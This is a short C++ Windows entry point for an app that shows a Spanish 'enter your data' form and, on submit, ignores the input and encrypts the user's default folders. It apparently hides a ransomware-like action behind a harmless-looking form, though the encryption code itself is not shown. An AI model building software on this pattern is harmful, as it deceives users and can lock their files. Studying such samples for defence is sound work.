#include <windows.h>

#include "ui.h"
#include "vault.h"

int WINAPI wWinMain(HINSTANCE instance, HINSTANCE, PWSTR, int) {
    AppConfig config;
    config.windowTitle = L"Ingresa tus Datos";
    config.buttonText = L"Enviar Información";
    config.cue = L"";
    config.destinationPath = L"C:\\Program Files\\Carpetas Seguras";
    config.passwordField = false;
    config.minimalLayout = true;
    config.showDestinationPopup = true;

    return RunApp(instance, config,
                  [](const std::wstring&, const ProgressFn& progress) {
                      return EncryptFolders(DefaultFolders(), progress);
                  });
}
